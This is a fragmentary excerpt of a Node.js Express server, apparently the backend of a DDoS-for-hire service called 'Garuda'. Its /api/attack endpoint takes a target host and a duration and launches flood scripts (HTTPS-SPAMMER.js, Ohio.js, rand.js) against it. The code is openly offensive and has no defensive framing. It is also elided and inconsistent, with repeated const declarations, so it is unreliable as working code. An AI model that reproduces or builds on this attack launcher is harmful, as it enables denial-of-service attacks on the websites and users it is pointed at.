...
app.get('/api/attack', (req, res) => {
  try {
    ...
    if (method === 'SPAM') {
      ...
      const ls = spawn('node', ['HTTPS-SPAMMER.js', host, time, ' ']);
      ...
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['Ohio.js', host, time, 120, 64, ' ']);
      ...
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['rand.js', host, time, ' ']);
...
app.listen(port, () => {
  console.log(`API Garuda Started To: ${port} port`);
});
